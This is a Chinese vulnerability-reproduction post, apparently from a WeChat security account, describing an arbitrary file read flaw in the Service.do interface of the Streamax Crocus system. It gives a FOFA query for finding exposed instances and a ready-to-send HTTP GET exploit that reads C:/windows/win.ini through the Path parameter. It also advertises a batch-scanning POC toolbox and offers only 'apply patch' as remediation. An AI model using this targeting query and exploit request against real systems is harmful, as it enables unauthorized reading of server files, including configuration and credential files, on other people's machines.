#  锐明Crocus系统Service.do接口存在任意文件读取漏洞 附POC   
2025-2-17更新  南风漏洞复现文库   2025-02-17 15:21  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 锐明Crocus系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
锐明Crocus系统  
## 2.漏洞描述  
  
锐明Crocus系统Service.do接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
锐明Crocus系统  
  
![锐明Crocus系统Service.do接口存在任意文件读取漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3aIS49TGN7ibhsH9va6x8TMgBKiafJoeWHOSiaZGu4HZKX3RIjiaRRF0aXMyYzAcGvTtyvl77MwTrxXHQ/640?wx_fmt=png&from=appmsg "null")  
  
锐明Crocus系统Service.do接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="inp_verification"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/Service.do?Action=Download&Path=C:/windows/win.ini  
  
漏洞数据包：  
```
GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aIS49TGN7ibhsH9va6x8TMgD1tnkcY5CeDCWOGHltzHkju5QmQ0XU4lj4Rt94TasY742w8Lianic0sA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aIS49TGN7ibhsH9va6x8TMgpyiaA378VfeQaibiaJXAEjSVn1ehgYgCPbw70ngqfHUzfPRpAWW7QxWag/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aIS49TGN7ibhsH9va6x8TMg8peTHcDQFWDPpfVMP3N3RfW3bNfI4cuBy13iaOrpnFVgzJh5LA5XUMA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aIS49TGN7ibhsH9va6x8TMgOg7LyMLlRq4uDjsTINeibZFbh5rs2yoPicPGCnYGUkL5Jakf48UoPgqg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aIS49TGN7ibhsH9va6x8TMgRLJfG6ZLK5qicvx73vrPzCmWhGNKvbUg8vWIKFJRdTA5fhjbIQo1lxA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aIS49TGN7ibhsH9va6x8TMget4rLu72It84abUo8GXoIpv3E1iahueefBny0icIiak1wee8uVw7pHKsQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
  
